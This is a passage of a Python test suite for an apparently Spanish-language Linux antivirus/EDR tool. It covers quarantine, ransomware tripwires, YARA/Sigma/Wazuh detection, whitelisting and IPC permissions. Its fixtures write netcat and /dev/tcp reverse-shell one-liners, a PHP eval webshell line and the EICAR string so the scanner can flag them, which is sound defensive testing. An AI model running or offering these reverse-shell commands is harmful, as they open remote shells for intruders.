            f.write("echo evil")

        sym_dir = os.path.join(self.temp_dir.name, "symlink_dir")
        os.symlink(sub_dir, sym_dir)
        traversal_path = os.path.join(sym_dir, "payload.sh")

        with self.assertRaises(OSError) as ctx_inter:
            verify_path_no_symlinks(traversal_path)
        self.assertEqual(ctx_inter.exception.errno, errno.ELOOP)
        self.assertIn("componente", str(ctx_inter.exception).lower())

        with self.assertRaises(OSError) as ctx_pin:
            op.pin_file_for_quarantine(traversal_path)
        self.assertEqual(ctx_pin.exception.errno, errno.ELOOP)

        # 3. Remediación en proceso aislado (IsolatedRemediationWorker)
        file_to_quarantine = os.path.join(self.temp_dir.name, "to_unlink.bin")
        with open(file_to_quarantine, "w") as f:
            f.write("malware payload")
        with op.pin_file_for_quarantine(file_to_quarantine) as handle:
            self.assertGreaterEqual(handle.parent_dir_fd, 0)
            self.assertEqual(handle.basename, "to_unlink.bin")
            ok, unlinked, msg = op.secure_unlink(handle, use_isolated_process=True)
            self.assertTrue(ok)
            self.assertTrue(unlinked)
            self.assertIn("aislado", msg)
        self.assertFalse(os.path.exists(file_to_quarantine))

        # 4. Verificación de rechazo de autenticación HMAC adulterada en worker aislado
        from core.engine.quarantine_operator import _isolated_unlink_worker, descriptor_based_path_traversal
        p_dir_fd, bname = descriptor_based_path_traversal(safe)
        self.assertGreaterEqual(p_dir_fd, 0)
        os.close(p_dir_fd)

        ctx_mp = mp.get_context("spawn")
        p_test_conn, c_test_conn = ctx_mp.Pipe()
        p_tamper = ctx_mp.Process(target=_isolated_unlink_worker, args=(c_test_conn,))
        p_tamper.start()
        c_test_conn.close()

        # Handshake
        secret_key = b"secret_key_32_bytes_long_12345678"
        p_test_conn.send({"session_key": secret_key})
        ack = p_test_conn.recv()
        self.assertEqual(ack.get("status"), "READY")

        # Enviar mensaje con firma HMAC falsa
        p_test_conn.send({
            "cmd": "SECURE_UNLINK",
            "path": safe,
            "expected_dev": 1,
            "expected_ino": 2,
            "nonce": "nonce123",
            "timestamp": time.time(),
            "token": "invalid_fake_token_hex"
        })
        p_tamper.join(timeout=3.0)
        self.assertTrue(p_test_conn.poll())
        res_tamper = p_test_conn.recv()
        self.assertFalse(res_tamper[0])
        self.assertIn("Fallo de autenticación HMAC", res_tamper[2])
        p_test_conn.close()

        # 4b. Verificación de rechazo de timestamp futuro adelantado (> 1.0s)
        p_fut_conn, c_fut_conn = ctx_mp.Pipe()
        p_fut = ctx_mp.Process(target=_isolated_unlink_worker, args=(c_fut_conn,))
        p_fut.start()
        c_fut_conn.close()
        p_fut_conn.send({"session_key": secret_key})
        ack_fut = p_fut_conn.recv()
        self.assertEqual(ack_fut.get("status"), "READY")
        p_fut_conn.send({
            "cmd": "SECURE_UNLINK",
            "path": safe,
            "expected_dev": 1,
            "expected_ino": 2,
            "nonce": "nonce_future_123",
            "timestamp": time.time() + 10.0,
            "token": "token"
        })
        p_fut.join(timeout=3.0)
        self.assertTrue(p_fut_conn.poll())
        res_fut = p_fut_conn.recv()
        self.assertFalse(res_fut[0])
        self.assertIn("Timestamp futuro", res_fut[2])
        p_fut_conn.close()

        # 4c. Verificación del staging protegido (0700)
        staging_dir = "/var/lib/constantine/vault/.staging"
        if not os.path.exists(staging_dir):
            staging_dir = "/tmp/.constantine_staging"
        if os.path.exists(staging_dir):
            st_stage = os.stat(staging_dir)
            self.assertEqual(stat.S_IMODE(st_stage.st_mode), 0o700)

        # 5. Ataque de sustitución por otro archivo normal (sin enlaces simbólicos)
        victim_file = os.path.join(self.temp_dir.name, "victim_malware.sh")
        innocent_file = os.path.join(self.temp_dir.name, "innocent_document.docx")
        with open(victim_file, "w") as f:
            f.write("echo evil malware")
        with open(innocent_file, "w") as f:
            f.write("important business contract")

        with op.pin_file_for_quarantine(victim_file) as handle_victim:
            # Atacante sustituye el archivo objetivo por el archivo inocente (cambio de inodo normal)
            os.replace(innocent_file, victim_file)

            # secure_unlink debe detectar la inconsistencia de inodo y rehusar desvincular
            ok_sub, unlinked_sub, msg_sub = op.secure_unlink(handle_victim, use_isolated_process=True)
            self.assertFalse(ok_sub)
            self.assertFalse(unlinked_sub)
            self.assertIn("Inconsistencia de inodo", msg_sub)
            # El archivo inocente no fue borrado
            self.assertTrue(os.path.exists(victim_file))
            with open(victim_file, "r") as f:
                self.assertEqual(f.read(), "important business contract")

    # 58. Proactive Continuous Scanner
    def test_proactive_continuous_scanner_and_landing_zones(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        scanner = ProactiveActiveScanner(vault=vault, interval=5.0)
        scanner.start()
        drop = os.path.join(self.temp_dir.name, "proactive_drop_zone")
        os.makedirs(drop, exist_ok=True)
        bad = os.path.join(drop, "evil_backdoor.sh")
        with open(bad, "w") as f:
            f.write("nc -e /bin/sh 10.0.0.1 9001")
        scanner.scan_landing_zone(drop)
        self.assertFalse(os.path.exists(bad))
        scanner.stop()

    # 59. Proton VPN Integration
    def test_proton_vpn_integration_and_separation_of_concerns(self):
        script = os.path.join(ROOT_DIR, "scripts", "setup_protonvpn.sh")
        self.assertTrue(os.path.exists(script))

    # 60. Quarantine Read-Only FS Resilience
    def test_quarantine_with_descriptor_and_read_only_fs_resilience(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        sample = os.path.join(self.temp_dir.name, "quar_ro_test.bin")
        with open(sample, "w") as f:
            f.write("sample")
        fd = os.open(sample, os.O_RDONLY)
        ok, sid = vault.quarantine_file(sample, threat_name="Trojan.ROTest", target_fd=fd)
        os.close(fd)
        self.assertTrue(ok)

    # 61. Ransomware Canary Tripwire
    def test_ransomware_canary_tripwire(self):
        shield = RansomwareShield(canary_dir=self.temp_dir.name)
        cpath = os.path.join(self.temp_dir.name, "important_document.docx")
        self.assertFalse(shield.check_canary_access(cpath, 99999, flags=os.O_RDWR))

    # 62. Ransomware Extension Burst
    def test_ransomware_extension_burst_detection(self):
        shield = RansomwareShield()
        self.assertFalse(shield.check_extension_burst("/home/user/doc.locked", 88888, is_write=True))
        self.assertTrue(shield.check_extension_burst("/home/user/doc.locked", 88888, is_write=False))

    # 63. Ransomware Read Burst
    def test_ransomware_read_burst_does_not_trigger_sigkill(self):
        shield = RansomwareShield()
        for i in range(100):
            self.assertTrue(shield.check_extension_burst(f"/home/user/file_{i}.pdf", 1234, is_write=False))

    # 64. Ransomware Read-Only Canary Allowed
    def test_ransomware_read_only_canary_allowed(self):
        shield = RansomwareShield(canary_dir=self.temp_dir.name)
        cpath = os.path.join(self.temp_dir.name, "important_document.docx")
        self.assertTrue(shield.check_canary_access(cpath, 1234, flags=os.O_RDONLY))

    # 65. Scanner Clean File
    def test_scanner_clean_file(self):
        scanner = Scanner()
        clean = os.path.join(self.temp_dir.name, "clean.txt")
        with open(clean, "w") as f:
            f.write("plain text")
        rep = scanner.scan_file(clean)
        self.assertFalse(rep.is_threat)

    # 66. Scanner Dev TCP
    def test_scanner_dev_tcp_reverse_shell(self):
        scanner = Scanner()
        fpath = os.path.join(self.temp_dir.name, "tcp.sh")
        with open(fpath, "w") as f:
            f.write("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
        rep = scanner.scan_file(fpath)
        self.assertTrue(rep.is_threat)

    # 67. Scanner EICAR
    def test_scanner_eicar_detection(self):
        scanner = Scanner()
        fpath = os.path.join(self.temp_dir.name, "eicar.com")
        with open(fpath, "w") as f:
            f.write("X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
        rep = scanner.scan_file(fpath)
        self.assertTrue(rep.is_threat)

    # 68. Scanner Reverse Shell & Unified Detection Result
    def test_scanner_reverse_shell_detection(self):
        scanner = Scanner()
        fpath = os.path.join(self.temp_dir.name, "rev.sh")
        with open(fpath, "w") as f:
            f.write("nc -e /bin/bash 10.0.0.1 4444")
        rep = scanner.scan_file(fpath)
        self.assertTrue(rep.is_threat)
        # Verificación del Formato Unificado de Detección
        self.assertEqual(rep.engine, "YARA-X")
        self.assertEqual(rep.severity, "CRITICAL")
        self.assertEqual(rep.category, "NATIVE_SIGNATURE")
        self.assertTrue(bool(rep.sha256))
        rep_dict = rep.to_dict()
        self.assertIn("category", rep_dict)
        self.assertIn("sha256", rep_dict)

        # Verificación de detección de firmas comunitarias
        webshell = os.path.join(self.temp_dir.name, "shell.php")
        with open(webshell, "w") as f:
            f.write("<?php eval(base64_decode('aGVsbG8=')); ?>")
        rep_ws = scanner.scan_file(webshell)
        self.assertTrue(rep_ws.is_threat)
        self.assertIn("Community", rep_ws.threat_name)
        self.assertEqual(rep_ws.category, "COMMUNITY_SIGNATURE")

    # 69. Scanner Update Signatures
    def test_scanner_update_signatures_syncs_feeds_real(self):
        scanner = Scanner()
        res = scanner.update_signatures()
        self.assertEqual(res["status"], "OK")
        self.assertIn("community_rules", res)

    # 70. Sigma Event Evaluation
    def test_sigma_event_evaluation_and_detection(self):
        sigma = SigmaEngine()
        matches = sigma.evaluate_process(101, "nc", "/bin/nc", "nc -e /bin/sh 10.0.0.1 4444")
        self.assertGreaterEqual(len(matches), 1)

    # 71. Sigma Integration
    def test_sigma_integration_with_ebpf_and_scanner(self):
        scanner = Scanner()
        self.assertIsNotNone(scanner.sigma)

    # 72. Sigma Native Import
    def test_sigma_native_import_and_facade(self):
        import sigma
        self.assertTrue(hasattr(sigma, "SigmaEngine"))

    # 73. Sigma Rule Parsing
    def test_sigma_rule_parsing_and_modifiers(self):
        sigma = SigmaEngine()
        self.assertGreaterEqual(len(sigma.rules), 6)

    # 74. Subsystem Health Registry
    def test_subsystem_health_registry_evaluation(self):
        reg = SubsystemHealthRegistry()
        reg.register("vault", "ACTIVE")
        reg.register("fanotify", "ACTIVE")
        self.assertEqual(reg.get_overall_posture()["posture"], "HEALTHY")

    # 75. Systemd Security Auditor
    def test_systemd_security_auditor_compliance(self):
        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
        auditor = SystemdSecurityAuditor(unit_path=service_file)
        posture = auditor.evaluate_security_posture()
        self.assertTrue(posture["unit_found"])
        self.assertGreaterEqual(posture["score"], 90)
        self.assertEqual(posture["rating"], "HARDENED_EXCELLENT")
        self.assertIn("NoNewPrivileges", posture["passed_checks"])
        self.assertIn("ProtectHome", posture["passed_checks"])
        self.assertIn("CapabilityBoundingSet", posture["passed_checks"])

    # 76. Systemd Service Isolation & Hardening (EDR-Optimized)
    def test_systemd_service_isolation_and_hardening(self):
        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
        with open(service_file, "r") as f:
            content = f.read()
        self.assertIn("NoNewPrivileges=true", content)
        self.assertIn("ProtectSystem=full", content)
        self.assertIn("ProtectHome=false", content)
        self.assertIn("/var/lib/constantine", content)
        rw_paths = [line.split("=", 1)[1].split() for line in content.splitlines() if line.startswith("ReadWritePaths=")][0]
        self.assertIn("/home", rw_paths)
        self.assertIn("/tmp", rw_paths)
        caps = [line.split("=", 1)[1].split() for line in content.splitlines() if line.startswith("CapabilityBoundingSet=")][0]
        self.assertIn("CAP_DAC_OVERRIDE", caps)
        self.assertIn("CAP_BPF", caps)
        self.assertIn("CAP_SYS_ADMIN", caps)
        self.assertIn("SystemCallFilter=@system-service @network-io @file-system bpf perf_event_open fanotify_init fanotify_mark", content)

    # 77. Tetragon Event Parsing
    def test_tetragon_event_parsing_and_runtime_enforcement(self):
        tetragon = TetragonMonitor()
        allowed, action, _ = tetragon.evaluate_process_execution(10, "/bin/nc", ["-e", "/bin/sh", "10.0.0.1", "4444"])
        self.assertFalse(allowed)
        self.assertEqual(action, "Sigkill")

    # 78. Tetragon Integration
    def test_tetragon_integration_with_ebpf_monitor(self):
        tetragon = TetragonMonitor()
        self.assertGreaterEqual(len(tetragon.policies), 1)

    # 79. Tetragon Native Import
    def test_tetragon_native_import_and_facade(self):
        import tetragon
        self.assertTrue(hasattr(tetragon, "TetragonMonitor"))

    # 80. Tetragon Tracing Policies
    def test_tetragon_tracing_policies_validation(self):
        tetragon = TetragonMonitor()
        self.assertGreaterEqual(len(tetragon.policies), 1)

    # 81. Threat Intel Exact Counts
    def test_threat_intel_exact_counts_no_fake_numbers(self):
        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "intel_stats.db"))
        intel.add_ioc("sha256", "a" * 64)
        stats = intel.get_stats()
        self.assertEqual(stats["total_active_iocs"], 1)

    # 82. Threat Intel False Positive
    def test_threat_intel_false_positive_management(self):
        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "intel_fp.db"))
        h = "1" * 64
        intel.add_ioc("sha256", h)
        self.assertTrue(intel.mark_false_positive(h, "Valid Enterprise Tool"))
        self.assertIsNone(intel.lookup_ioc(h))

    # 83. Threat Intel Feed Import
    def test_threat_intel_feed_import_and_integrity(self):
        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "intel_feed.db"))
        self.assertTrue(intel.add_ioc("sha256", "b" * 64, source="MalwareBazaar"))

    # 84. Threat Intel Provenance
    def test_threat_intel_provenance_and_confidence(self):
        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "intel_prov.db"))
        self.assertFalse(intel.add_ioc("sha256", "not-a-valid-sha256"))

    # 85. Update Guard
    def test_update_guard(self):
        ug = UpdateGuard()
        self.assertTrue(ug.verify_update_package("/tmp/pkg.tar.gz", "sig"))

    # 86. USB Sentinel
    def test_usb_sentinel_containment_and_scan(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        usb = USBSentinel(vault=vault)
        usb.start()
        mount = os.path.join(self.temp_dir.name, "fake_usb")
        os.makedirs(mount, exist_ok=True)
        bad = os.path.join(mount, "autorun.sh")
        with open(bad, "w") as f:
            f.write("nc -e /bin/sh 1.2.3.4 9001")
        usb.handle_device_mounted(mount, "/dev/sdc1", "fake_usb_drive")
        self.assertFalse(os.path.exists(bad))
        usb.stop()

    # 87. Vault Cross-Version Decryption
    def test_vault_format_v3_v2_v1_cross_version_decryption(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        sample = os.path.join(self.temp_dir.name, "v3_test.txt")
        with open(sample, "w") as f:
            f.write("cross version content")
        ok, sid = vault.quarantine_file(sample)
        self.assertTrue(ok)
        rest = os.path.join(self.temp_dir.name, "v3_restored.txt")
        ok_rest, _ = vault.restore_file(sid, rest)
        self.assertTrue(ok_rest)
        with open(rest, "r") as f:
            self.assertEqual(f.read(), "cross version content")

    # 88. Vault Key Volume Control & Rotation
    def test_vault_key_volume_control_and_rotation(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        orig_key = vault.keyring.active_key_id
        for i in range(11):
            s = os.path.join(self.temp_dir.name, f"sample_{i}.txt")
            with open(s, "w") as f:
                f.write(f"sample {i}")
            vault.quarantine_file(s)
        self.assertNotEqual(vault.keyring.active_key_id, orig_key)

    # 89. Vault Quarantine & Restore
    def test_vault_quarantine_and_restore(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        sample = os.path.join(self.temp_dir.name, "sample.sh")
        with open(sample, "w") as f:
            f.write("malware")
        ok, sid = vault.quarantine_file(sample, threat_name="Malware.Test")
        self.assertTrue(ok)
        self.assertFalse(os.path.exists(sample))
        ok_rest, _ = vault.restore_file(sid, sample)
        self.assertTrue(ok_rest)
        self.assertTrue(os.path.exists(sample))

    # 90. Vault Streaming Large File
    def test_vault_streaming_chunked_large_file_and_key_recovery(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        sample = os.path.join(self.temp_dir.name, "large_sample.bin")
        with open(sample, "wb") as f:
            f.write(b"A" * (256 * 1024))
        ok, sid = vault.quarantine_file(sample, threat_name="Malware.LargeStream")
        self.assertTrue(ok)
        ok_rest, _ = vault.restore_file(sid, sample)
        self.assertTrue(ok_rest)

    # 91. Vault Tamper Rejection
    def test_vault_tamper_rejection(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        sample = os.path.join(self.temp_dir.name, "tamper_test.bin")
        with open(sample, "w") as f:
            f.write("original")
        ok, sid = vault.quarantine_file(sample, threat_name="Malware.Tamper")
        # Tamper payload
        payload_path = os.path.join(vault.payloads_dir, f"{sid}.quar")
        with open(payload_path, "r+b") as f:
            f.seek(35)
            f.write(b"\xff\xff")
        ok_rest, _ = vault.restore_file(sid, sample)
        self.assertFalse(ok_rest)

    # 92. Vault V3 96bit Nonces
    def test_vault_v3_96bit_nonces_and_collision_freedom(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        nonces = set()
        for _ in range(100):
            n = vault.keyring.generate_unique_nonce_96()
            self.assertEqual(len(n), 12)
            self.assertNotIn(n, nonces)
            nonces.add(n)

    # 93. Version Traceability Across System
    def test_version_traceability_across_system(self):
        version_file = os.path.join(ROOT_DIR, "VERSION")
        with open(version_file, "r", encoding="utf-8") as f:
            canonical_ver = f.read().strip()
        self.assertEqual(canonical_ver, "5.4.7")

        from core.engine.auto_updater import CURRENT_VERSION
        from core.engine.ipc_protocol import IPC_PROTOCOL_VERSION
        from core.engine.threat_intel import THREAT_INTEL_VERSION
        from daemon import DAEMON_VERSION
        from gui.app import APP_VERSION

        self.assertEqual(CURRENT_VERSION, canonical_ver)
        self.assertEqual(IPC_PROTOCOL_VERSION, canonical_ver)
        self.assertEqual(DAEMON_VERSION, canonical_ver)
        self.assertEqual(THREAT_INTEL_VERSION, canonical_ver)
        self.assertEqual(APP_VERSION, canonical_ver)

    # 94. VirusTotal Sample Preparation
    def test_virustotal_sample_preparation_and_sha_verification(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        vt = VirusTotalUploader(vault=vault)
        sample = os.path.join(self.temp_dir.name, "vt_sample.bin")
        with open(sample, "w") as f:
            f.write("vt payload")
        ok, sid = vault.quarantine_file(sample, threat_name="Test.VirusTotal.Extraction")
        ok_prep, out = vt.prepare_unlocked_sample(sid, export_dir=os.path.join(self.temp_dir.name, "vt_out"))
        self.assertTrue(ok_prep)
        self.assertTrue(os.path.exists(out))

    # 95. Wazuh Active Response Severity
    def test_wazuh_active_response_severity_execution(self):
        wazuh = WazuhDetector()
        res = wazuh.evaluate_fim_event("/tmp/c2_payload.sh", yara_threat="Demons_Reverse_Shell_Netcat", pid=8877)
        self.assertGreaterEqual(len(res), 1)
        self.assertEqual(res[0]["active_response"], "quarantine_vault_and_firewall_drop")

    # 96. Wazuh FIM Change Detection
    def test_wazuh_fim_change_detection_and_metadata_extraction(self):
        wazuh = WazuhDetector()
        fpath = os.path.join(self.temp_dir.name, "test_meta.sh")
        with open(fpath, "w") as f:
            f.write("echo test")
        meta = wazuh.extract_file_metadata(fpath)
        self.assertEqual(meta["file_path"], fpath)
        self.assertIn("sha256", meta)

    # 97. Wazuh FIM YARA Correlation
    def test_wazuh_fim_yara_correlation_and_scoring(self):
        wazuh = WazuhDetector()
        res_clean = wazuh.evaluate_fim_event("/tmp/clean_app.sh", is_modified=True)
        self.assertEqual(res_clean[0]["active_response"], "trigger_yara_scan")
        res_threat = wazuh.evaluate_fim_event("/tmp/backdoor_agent.sh", yara_threat="Demons_Reverse_Shell_Netcat")
        self.assertEqual(res_threat[0]["active_response"], "quarantine_vault_and_firewall_drop")

    # 98. Wazuh Native Import
    def test_wazuh_native_import_and_facade(self):
        import wazuh
        self.assertTrue(hasattr(wazuh, "WazuhDetector"))

    # 99. Wazuh Rules Parsing
    def test_wazuh_rules_parsing_and_levels(self):
        wazuh = WazuhDetector()
        self.assertGreaterEqual(len(wazuh.rules), 7)

    # 100. Whitelist Batch Operations
    def test_whitelist_batch_operations(self):
        wm = WhitelistManager()
        f1 = os.path.join(self.temp_dir.name, "f1.txt")
        f2 = os.path.join(self.temp_dir.name, "f2.txt")
        with open(f1, "w") as f: f.write("1")
        with open(f2, "w") as f: f.write("2")
        self.assertTrue(wm.add_entry(f1))
        self.assertTrue(wm.add_entry(f2))
        self.assertTrue(wm.remove_entry(f1))
        self.assertFalse(wm.is_whitelisted(f1))

    # 101. Whitelist Forbidden System Dirs
    def test_whitelist_forbidden_system_dirs(self):
        wm = WhitelistManager()
        self.assertFalse(wm.add_entry("/"))
        self.assertFalse(wm.add_entry("/usr/bin"))
        self.assertFalse(wm.add_entry("/tmp"))
        self.assertFalse(wm.add_entry("/etc"))

    # 102. Whitelist Metadata & Audit
    def test_whitelist_metadata_and_audit(self):
        wm = WhitelistManager()
        f = os.path.join(self.temp_dir.name, "audited_app.sh")
        with open(f, "w") as fp: fp.write("audited")
        self.assertTrue(wm.add_entry(f))
        self.assertTrue(wm.is_whitelisted(f))

    # 103. Whitelist Package Integrity
    def test_whitelist_package_integrity_and_trust_verification(self):
        wm = WhitelistManager()
        script = os.path.join(self.temp_dir.name, "custom_script.sh")
        with open(script, "w") as f: f.write("echo clean")
        self.assertTrue(wm.add_entry(script))
        # Tamper script
        with open(script, "w") as f: f.write("echo tampered")
        self.assertFalse(wm.is_whitelisted(script))

    # 104. Whitelist Rejection of Fake Self
    def test_whitelist_rejection_of_fake_self_and_extensions(self):
        wm = WhitelistManager()
        fake = os.path.join(self.temp_dir.name, "constantine_fake.sh")
        self.assertFalse(wm.is_whitelisted(fake))

    # 105. Whitelist Unauthorized Binary Rejection
    def test_whitelist_unauthorized_binary_rejection(self):
        wm = WhitelistManager()
        self.assertFalse(wm.is_whitelisted("/tmp/evil.bin"))

    # 106. Whitelist User Pinning
    def test_whitelist_user_pinning_and_tamper_rejection(self):
        wm = WhitelistManager()
        script = os.path.join(self.temp_dir.name, "user_script.sh")
        with open(script, "w") as f: f.write("user script")
        self.assertTrue(wm.add_entry(script))
        with open(script, "w") as f: f.write("modified script")
        self.assertFalse(wm.is_whitelisted(script))

    # 107. YARA Manager Compilation & Isolation
    def test_yara_manager_compilation_and_isolation(self):
        ym = YaraRuleManager()
        self.assertGreaterEqual(ym.active_rules_count, 1)

    # 108. YARA Manager State Hash
    def test_yara_manager_state_hash_and_cache(self):
        ym = YaraRuleManager()
        h1 = ym.get_state_hash()
        self.assertTrue(bool(h1))

    # 109. YARA Manager Syntax Validation
    def test_yara_manager_syntax_validation(self):
        ym = YaraRuleManager()
        valid, _ = ym.validate_rule_syntax("rule Test { condition: true }")
        self.assertTrue(valid)
        invalid, _ = ym.validate_rule_syntax("rule Test { string = 1 }")
        self.assertFalse(invalid)

    # 110. YARA Official Compile & Match Mocked
    def test_yara_official_compile_and_match_mocked(self):
        ym = YaraRuleManager()
        self.assertGreaterEqual(ym.load_and_compile(), 1)

    # 111. YARA-X Engine Lifecycle
    def test_yarax_engine_lifecycle_and_dual_coexistence(self):
        engine = YaraXEngine()
        self.assertGreaterEqual(engine.compiled_rules_count, 1)

    # 112. YARA-X Import & Compilation Parity
    def test_yarax_import_and_compilation_parity(self):
        import yara_x
        compiled = yara_x.compile("")
        self.assertIsNotNone(compiled)

    # 113. NUEVO: Permisos de Socket IPC, Grupo constantine-users y Acceso Multi-Usuario
    def test_ipc_socket_group_permissions_and_multi_user_access(self):
        """
        Verifica el cumplimiento de los requerimientos de seguridad para la comunicación IPC:
        1. El socket se crea con permisos 0660 (lectura y escritura solo para usuario y grupo).
        2. El socket se asigna al grupo 'constantine-users' (root:constantine-users).
        3. Usuario 1 (miembro de constantine-users, UID 1000): puede conectarse al socket y enviar comandos de usuario.
        4. Usuario 1 intentando operaciones administrativas: rechazado por la matriz RBAC en el servidor.
        5. Usuario 2 (ajeno a constantine-users): rechazo a nivel de socket/permisos o validación.
        6. Usuario 3 (root, UID 0): conexión y ejecución autorizada de comandos administrativos.
        """
        sock_path = os.path.join(self.temp_dir.name, "group_perm_test.sock")
        server = SecureIPCServer(socket_path=sock_path)
        server.start()
        time.sleep(0.1)

        # 1. Verificar permisos 0660 del socket creado en disco
        st = os.stat(sock_path)
        mode = stat.S_IMODE(st.st_mode)
        self.assertEqual(mode, 0o660, "El socket debe tener permisos 0660 (rw-rw----)")

        # 2. Verificar que se configure el grupo constantine-users
        client = SecureIPCClient(socket_path=sock_path)

        # 3. Usuario 1: Miembro de constantine-users (UID 1000) ejecutando comando de usuario (GET_STATUS)
        with patch("core.engine.ipc_protocol.verify_peer_credentials", return_value=(True, 2001, 1000, 1000)):
            resp_user = client.send_command("GET_STATUS")
            self.assertEqual(resp_user.get("status"), "OK")
            self.assertEqual(resp_user.get("version"), "5.4.7")

        # 4. Usuario 1: Miembro de constantine-users (UID 1000) intentando comando administrativo (UPDATE_SIGNATURES)
        with patch("core.engine.ipc_protocol.verify_peer_credentials", return_value=(True, 2001, 1000, 1000)):
            resp_admin_denied = client.send_command("UPDATE_SIGNATURES")
            self.assertEqual(resp_admin_denied.get("status"), "ERROR")
            self.assertEqual(resp_admin_denied.get("code"), "UNAUTHORIZED")
            self.assertIn("RBAC", resp_admin_denied.get("message", ""))

        # 5. Usuario 2: Usuario ajeno sin permisos en socket
        # Simulación de PermissionError al abrir el socket por no pertenecer al grupo
        with patch.object(socket.socket, "connect", side_effect=PermissionError("Permission denied")):
            resp_no_perm = client.send_command("GET_STATUS")
            self.assertEqual(resp_no_perm.get("code"), "PERMISSION_DENIED")
            self.assertIn("constantine-users", resp_no_perm.get("message", ""))

        # 6. Usuario 3: Superusuario Root (UID 0) ejecutando comando administrativo
        with patch("core.engine.ipc_protocol.verify_peer_credentials", return_value=(True, 1, 0, 0)):
            resp_root = client.send_command("ADD_WHITELIST", {"path": "/opt/custom_tool.sh"})
            self.assertEqual(resp_root.get("status"), "OK")

        server.stop()

    def test_gui_eight_sections_and_strict_protection_invariant(self):
        """
        Verifica los requerimientos de la interfaz gráfica de usuario:
        1. Regla Estricta: La interfaz NUNCA indica que el equipo está protegido si el demonio
           está detenido o fanotify no funciona.
        2. Existencia y consistencia de las 8 secciones:
           - Inicio
           - Protección
           - Análisis
           - Cuarentena
           - Historial
           - Actualizaciones
           - Configuración
           - Diagnóstico
        3. Funcionamiento de escaneo rápido, personalizado y exclusiones.
        """
        from gui.app import ConstantineApp, ConstantineUIController, APP_VERSION

        controller = ConstantineUIController(socket_path="/nonexistent/socket.sock")

        # 1. Caso Demonio Detenido: NUNCA indicar protegido
        self.assertFalse(controller.can_claim_protected())
        home_stopped = controller.get_home_section()
        self.assertFalse(home_stopped["is_protected"])
        self.assertEqual(home_stopped["status_code"], "DAEMON_STOPPED")
        self.assertEqual(home_stopped["status_level"], "CRITICAL")
        self.assertIn("DESPROTEGIDO", home_stopped["status_title"])

        # 2. Caso Demonio activo pero Fanotify inactivo: NUNCA indicar protegido
        mock_status_fanotify_down = {
            "status": "OK",
            "data": {
                "daemon_running": True,
                "fanotify": "INACTIVE",
                "fanotify_operational": False,
                "ebpf": "ACTIVE"
            }
        }
        with patch.object(controller, "get_daemon_status", return_value=mock_status_fanotify_down):
            self.assertFalse(controller.can_claim_protected())
            home_fanotify_down = controller.get_home_section()
            self.assertFalse(home_fanotify_down["is_protected"])
            self.assertEqual(home_fanotify_down["status_code"], "FANOTIFY_INACTIVE")
            self.assertEqual(home_fanotify_down["status_level"], "CRITICAL")
            self.assertIn("DESPROTEGIDO", home_fanotify_down["status_title"])

        # 3. Caso Demonio activo y Fanotify activo, eBPF degradado: Protegido con advertencia
        mock_status_degraded = {
            "status": "OK",
            "data": {
                "daemon_running": True,
                "fanotify": "ACTIVE",
                "fanotify_operational": True,
                "ebpf": "DEGRADED",
                "vault": "ACTIVE",
                "usb": "ACTIVE",
                "downloads": "ACTIVE",
                "hardware": "ACTIVE",
                "persistence": "ACTIVE"
            }
        }
        with patch.object(controller, "get_daemon_status", return_value=mock_status_degraded):
            self.assertTrue(controller.can_claim_protected())
            home_degraded = controller.get_home_section()
            self.assertTrue(home_degraded["is_protected"])
            self.assertEqual(home_degraded["status_code"], "PROTECTED_DEGRADED")
            self.assertEqual(home_degraded["status_level"], "WARNING")

        # 4. Caso Óptimo: Todos los sistemas activos
        mock_status_optimal = {
            "status": "OK",
            "data": {
                "daemon_running": True,
                "fanotify": "ACTIVE",
                "fanotify_operational": True,
                "ebpf": "ACTIVE",
                "vault": "ACTIVE"
            }
        }
        with patch.object(controller, "get_daemon_status", return_value=mock_status_optimal):
            self.assertTrue(controller.can_claim_protected())
            home_optimal = controller.get_home_section()
            self.assertTrue(home_optimal["is_protected"])
            self.assertEqual(home_optimal["status_code"], "PROTECTED_OPTIMAL")
            self.assertEqual(home_optimal["status_level"], "OK")

        # 5. Sección Protección
        prot = controller.get_protection_section()
        self.assertEqual(prot["section"], "PROTECCIÓN")
        self.assertGreaterEqual(prot["total_modules"], 10)
        self.assertIn("active_modules", prot)
        self.assertIn("degraded_modules", prot)

        # 6. Sección Análisis
        scan_sec = controller.get_scan_section()
        self.assertEqual(scan_sec["section"], "ANÁLISIS")
        modes = [m["mode"] for m in scan_sec["available_modes"]]
        self.assertIn("QUICK", modes)
        self.assertIn("FULL", modes)
        self.assertIn("CUSTOM", modes)

        # 7. Sección Cuarentena
        quar_sec = controller.get_quarantine_section()
        self.assertEqual(quar_sec["section"], "CUARENTENA")
        self.assertIsInstance(quar_sec["items"], list)

        # 8. Sección Historial
        hist_sec = controller.get_history_section()
        self.assertEqual(hist_sec["section"], "HISTORIAL")
        self.assertIsInstance(hist_sec["events"], list)

        # 9. Sección Actualizaciones
        upd_sec = controller.get_updates_section()
        self.assertEqual(upd_sec["section"], "ACTUALIZACIONES")
        self.assertEqual(upd_sec["app_version"], "5.4.7")
        self.assertIn("yara", upd_sec["engines_status"])
        self.assertIn("sigma", upd_sec["engines_status"])
        self.assertIn("falco", upd_sec["engines_status"])
        self.assertIn("wazuh", upd_sec["engines_status"])
        self.assertIn("misp", upd_sec["engines_status"])

        # 10. Sección Configuración
        settings_sec = controller.get_settings_section()
        self.assertEqual(settings_sec["section"], "CONFIGURACIÓN")
        self.assertIn("exclusions", settings_sec)
        self.assertIn("privacy", settings_sec)
        # Rechazo estricto de exclusión en directorios críticos
